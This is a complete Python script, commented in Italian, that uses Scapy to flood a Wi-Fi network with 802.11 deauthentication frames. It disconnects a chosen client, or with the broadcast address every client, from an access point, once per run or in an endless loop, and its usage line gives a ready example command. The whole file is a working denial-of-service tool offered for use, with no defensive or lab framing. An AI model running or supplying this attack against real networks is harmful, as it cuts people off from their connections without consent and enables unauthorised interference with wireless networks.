#!/usr/bin/env python3
import sys
import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth(iface, target_mac, gateway_mac, count=None):
    """
    Invia pacchetti di deautenticazione per disconnettere un client dal Wi-Fi.
    iface: interfaccia in monitor mode (es. wlan0mon)
    target_mac: MAC address del dispositivo da disconnettere (o FF:FF:FF:FF:FF:FF per tutti)
    gateway_mac: MAC address dell'Access Point (Router)
    """
    # Pacchetto dal router al client
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    # Pacchetto dal client al router (per sicurezza)
    dot11_rev = Dot11(addr1=gateway_mac, addr2=target_mac, addr3=gateway_mac)
    packet_rev = RadioTap()/dot11_rev/Dot11Deauth(reason=7)

    print(f"[*] Inizio attacco deauth su {iface}...")
    print(f"[*] Target: {target_mac} <--> Gateway: {gateway_mac}")

    try:
        if count:
            for i in range(count):
                sendp(packet, iface=iface, verbose=False)
                sendp(packet_rev, iface=iface, verbose=False)
                time.sleep(0.1)
        else:
            while True:
                sendp(packet, iface=iface, verbose=False)
                sendp(packet_rev, iface=iface, verbose=False)
                time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[*] Attacco terminato.")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 deauth.py <interface> <target_mac> <gateway_mac> [count]")
        print("Esempio: sudo python3 deauth.py wlan0mon FF:FF:FF:FF:FF:FF AA:BB:CC:DD:EE:FF")
        sys.exit(1)

    iface = sys.argv[1]
    target = sys.argv[2]
    gateway = sys.argv[3]
    count = int(sys.argv[4]) if len(sys.argv) > 4 else None

    deauth(iface, target, gateway, count)
